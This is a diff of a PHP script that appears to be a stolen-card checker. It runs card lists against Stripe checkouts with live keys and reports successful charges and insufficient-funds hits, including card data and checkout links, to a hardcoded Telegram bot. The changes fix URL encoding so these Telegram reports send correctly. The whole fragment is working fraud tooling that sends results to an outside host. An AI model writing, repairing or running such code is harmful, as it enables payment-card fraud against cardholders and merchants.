@@ -77,7 +77,7 @@ if (strlen($ano) == 2) $ano = "20$ano";
 
 $pklive = $_GET['pklive'];
 $cslive = $_GET['cslive'];
-$colink = urlencode($_GET['colink']);
+$colink = $_GET['colink'];
 $xamount = $_GET['xamount'];
 $xemail = $_GET['xemail'];
 
@@ -383,12 +383,12 @@ $chatID = urlencode('-1001815647781');
 
 #############SEND TO TG BOT WHEN CHARGED
 $charged_message = "Successfull Checkout\r\n\nBIN:\r\n$lista\r\nSuccess URL:\r\n".urlencode($success)."\r\nAmount: ".strtoupper($currency)." $xamount\r\n\nChecked from:\r\n$domain";
-$sendcharged = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.$charged_message.'';
+$sendcharged = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.urlencode($charged_message).'';
 
 #############SEND TO TG BOT WHEN INSUFFBAL
-$insuf_message = "Insufficient Funds\r\n\nBIN: $lista\r\nAmount_to_bill:\r\n".strtoupper($currency)." $xamount\r\nAStripe%20Checkout%20link:\r\n$colink\r\n\nChecked from:\r\n$domain";
-$sendinsuff = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.$insuf_message.'';
-
+$insuf_message = "Insufficient Funds\r\n\nBIN: $lista\r\nAmount to bill: ".strtoupper($currency)." $xamount\r\nStripe Checkout link:\r\n$colink\r\n\nChecked from:\r\n$domain";
+$sendinsuff = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.urlencode($insuf_message).'';
+    
 #############BOT RETRY TO SEND IF ITS NOT WORKS
 $max_retries = 3;
 $num_retries = 0;
